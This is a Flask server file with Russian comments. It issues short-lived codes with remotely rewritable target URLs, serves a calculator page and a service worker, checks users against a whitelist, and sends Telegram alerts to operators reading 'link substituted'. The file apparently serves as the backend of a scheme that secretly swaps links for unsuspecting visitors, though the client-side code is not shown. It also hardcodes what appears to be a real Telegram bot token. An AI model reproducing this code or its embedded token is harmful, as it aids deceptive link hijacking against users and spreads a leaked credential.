from flask import Flask, render_template, request, jsonify, make_response, send_file
import random
from datetime import datetime
import logging
import os
from urllib.parse import urlparse, parse_qs
import requests
import redis
import json

# Настройки Redis
redis_client = redis.Redis(host='localhost', port=6379, db=1, decode_responses=True)
CODE_EXPIRE_SECONDS = 2 * 60  # 2 минуты

# Настройки Flask
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__)))
app = Flask(__name__, template_folder=os.path.join(BASE_DIR, 'templates'), static_folder=os.path.join(BASE_DIR, 'static'))

# Telegram
TELEGRAM_BOT_TOKEN = "7953140297:AAGwWVx3zwmo-9MbQ-UUU1764nljCxuncQU"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

# Логирование
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[logging.StreamHandler()])
logger = logging.getLogger(__name__)


def generate_unique_code():
    while True:
        code = str(random.randint(5000, 9999))
        if not redis_client.exists(code):
            return code


@app.route('/')
def index():
    code = generate_unique_code()

    data = {
        'created': datetime.now().isoformat(),
        'target_url': "https://ru.wikipedia.org/wiki/",
        'used': False
    }
    redis_client.set(code, json.dumps(data), ex=CODE_EXPIRE_SECONDS)

    months = [
        "января", "февраля", "марта", "апреля", "мая", "июня",
        "июля", "августа", "сентября", "октября", "ноября", "декабря"
    ]
    now = datetime.now()
    current_date = f"{now.day} {months[now.month - 1]} {now.year}"

    logger.info(f"Сгенерирован новый код: {code}")

    response = make_response(render_template('base.html', code=code, current_date=current_date))
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response


@app.route('/update_code', methods=['POST'])
def update_code():
    data = request.json
    code = data.get('code')
    new_url = data.get('new_url')

    if not code or not new_url:
        return jsonify({'status': 'error', 'message': 'Missing parameters'}), 400

    code_data_raw = redis_client.get(code)
    if not code_data_raw:
        return jsonify({'status': 'error', 'message': 'Code not found'}), 404

    code_data = json.loads(code_data_raw)
    code_data['target_url'] = new_url
    code_data['used'] = True

    redis_client.set(code, json.dumps(code_data), ex=CODE_EXPIRE_SECONDS)
    logger.info(f"Код {code} обновлён: {code_data}")
    return jsonify({'status': 'success'})


@app.route('/get_target_url')
def get_target_url():
    code = request.args.get('code')
    if not code:
        return jsonify({'error': 'Code missing'}), 400

    code_data_raw = redis_client.get(code)
    if not code_data_raw:
        return jsonify({'url': "https://ru.wikipedia.org/wiki/", 'is_updated': False})

    code_data = json.loads(code_data_raw)
    return jsonify({
        'url': code_data['target_url'],
        'is_updated': code_data.get('used', False)
    })


@app.route('/notify_if_updated', methods=['POST'])
def notify_if_updated():
    data = request.json
    url = data.get('url')

    if not url or "ref=" not in url:
        return jsonify({'status': 'error', 'message': 'No ref in url'}), 400

    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    user_id = query_params.get('ref', [None])[0]

    if not user_id:
        return jsonify({'status': 'error', 'message': 'Invalid ref'}), 400

    message_text = f"🔔 Ссылка подменена"
    payload = {'chat_id': user_id, 'text': message_text}

    try:
        response = requests.post(TELEGRAM_API_URL, json=payload)
        if response.ok:
            return jsonify({'status': 'success'})
        else:
            return jsonify({'status': 'error', 'message': 'Failed to send message'}), 500
    except Exception as e:
        logger.exception("Ошибка при отправке сообщения")
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/calculator')
def calculator():
    # ref приходит в query string, но можно не использовать в Python,
    # потому что JS на клиенте заберёт его из URL сам
    ref = request.args.get('ref', '')
    return render_template('calculator.html', ref=ref) 


@app.route('/sw.js')
def serve_sw():
    return send_file('sw.js', mimetype='application/javascript')


@app.route('/check_user_id')
def check_user_id():
    user_id = request.args.get('id', '').strip()
    if not user_id.isdigit():
        return {"status": "error", "message": "Некорректный ID"}, 400

    try:
        with open("authorized_users.txt", "r") as f:
            authorized_ids = {line.strip() for line in f if line.strip().isdigit()}
        if user_id in authorized_ids:
            return {"status": "ok"}
        else:
            return {"status": "not_found"}
    except FileNotFoundError:
        return {"status": "error", "message": "Файл не найден"}, 500
